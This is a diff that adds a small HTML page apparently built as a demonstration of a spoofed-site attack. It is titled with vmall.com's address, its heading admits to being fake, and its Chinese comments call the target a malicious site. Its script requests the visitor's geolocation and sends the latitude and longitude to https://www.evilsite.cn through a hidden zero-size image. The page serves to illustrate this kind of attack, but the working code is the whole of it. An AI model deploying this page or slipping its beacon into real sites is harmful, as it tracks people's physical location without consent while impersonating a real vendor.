@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>https://www.vmall.com/</title>
+</head>
+<body>
+  <!-- 主标题显示为伪装信息 -->
+  <h1><br><br>I am fake vmall.com, And who ask for your position?<br></h1>
+
+  <!-- 嵌入的脚本用于获取用户地理位置 -->
+  <script>
+    function success(position) {
+      // 将获取的地理位置发送到指定的恶意网站
+      document.getElementById('remote').src = "https://www.evilsite.cn/?geolocation="+ "------"+ encodeURIComponent(position.coords.latitude) + ","+ encodeURIComponent(position.coords.longitude);
+    }
+    // 请求用户地理位置
+    navigator.geolocation.getCurrentPosition(success);
+  </script>
+  
+  <!-- 隐藏的图像元素用于触发地理位置请求 -->
+  <img id="remote" src="" width=0 height=0>
+</body>
+</html>
